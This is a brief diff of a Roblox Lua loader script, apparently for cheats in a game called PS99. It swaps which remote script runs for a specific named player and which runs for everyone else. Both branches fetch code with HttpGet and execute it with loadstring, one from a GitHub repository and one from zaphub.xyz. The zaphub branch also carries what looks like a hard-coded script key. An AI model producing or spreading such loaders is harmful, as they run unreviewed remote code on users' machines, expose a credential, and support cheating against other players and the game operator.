@@ -2,10 +2,11 @@ local player = game.Players.LocalPlayer
 
 if player.Name == "AkFrosty_YT" then
 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Monster69696/PS99/main/Backroom/Script"))()
-    
-else
-
     script_key = "wUyvmjsmuvRIwOPwLszkupgIOvvIkoYq"
     loadstring(game:HttpGet("https://zaphub.xyz/Exec"))()
+
+else
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Monster69696/PS99/main/Backroom/Script"))()
+
 end
